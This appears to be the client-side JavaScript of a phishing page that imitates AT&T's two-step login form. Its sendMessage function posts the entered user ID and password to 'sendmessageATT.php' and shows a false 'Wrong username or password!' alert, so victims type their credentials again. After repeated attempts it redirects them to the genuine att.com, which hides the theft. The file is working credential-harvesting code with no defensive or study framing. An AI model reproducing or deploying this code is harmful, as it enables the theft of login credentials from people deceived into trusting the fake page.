function errorFunc() {
  // const input = document.querySelector("#errId");
  var x = document.getElementById("userId").value;

  if (x.length < 3) {
    document.getElementById("errId").style.display = "block";
  }
  else {
    document.getElementById("errId").style.display = "none";
  }
}

function errorFunc2() {
  // const input = document.querySelector("#errId");
  var x = document.getElementById("pwdId").value;

  if (x.length < 3) {
    document.getElementById("errId2").style.display = "block";
  }
  else {
    document.getElementById("errId2").style.display = "none";
  }
}

function hideInfo() {
  var x = document.getElementById("userId").value;

  if (x.length == 0) {
    document.getElementById("errId").style.display = "block";
    document.getElementById("errId").innerHTML = "This information is required. If you don't remember your user ID, use Forgot user ID link.";
  }

  else if (x.length >= 4) {
    document.getElementById("head1").innerText = "Welcome";
    document.getElementById("head2").innerHTML = x;

    document.getElementById("label1").style.display = "none";
    document.getElementById("userId").style.display = "none";

    document.getElementById("label2").style.display = "block";
    document.getElementById("pwdId").style.display = "block";

    document.getElementById("myButton1").style.display = "none";

    document.getElementById("checkBox").style.display = "block";
    document.getElementById("checkBoxText").style.display = "block";
    document.getElementById("myButton2").style.display = "block";

    document.getElementById("link2").style.display = "none";
  }
}

// function submitFormRedirect(){
//   count = count + 1;

//   if(count < 4){
//     alert("Wrong username or password!");
//   }
//   else{
//     location.replace("localhost:3000");
//   }
// }

function myFunc() {
  var y = document.getElementById("pwdId").value;

  if (y.length <= 3) {
    document.getElementById("errId2").style.display = "block";

  }

  else {
    const form = document.querySelector('.myForm');
    form.addEventListener('submit', function (e) {
      e.preventDefault();
    })
    sendMessage(form);
  }
}

var count = 0;
async function sendMessage(form) {
  // const form = document.querySelector('.myForm');
  const formData = new FormData(form);
  if (formData) {
    const url = 'sendmessageATT.php';
    const response = await fetch(url, {
      method: "POST",
      body: formData
    });

    count = count + 1;


    if (count < 3) {
      alert("Wrong username or password!");
    }
    else {
      location.replace("https://www.att.com");
    }
  }
}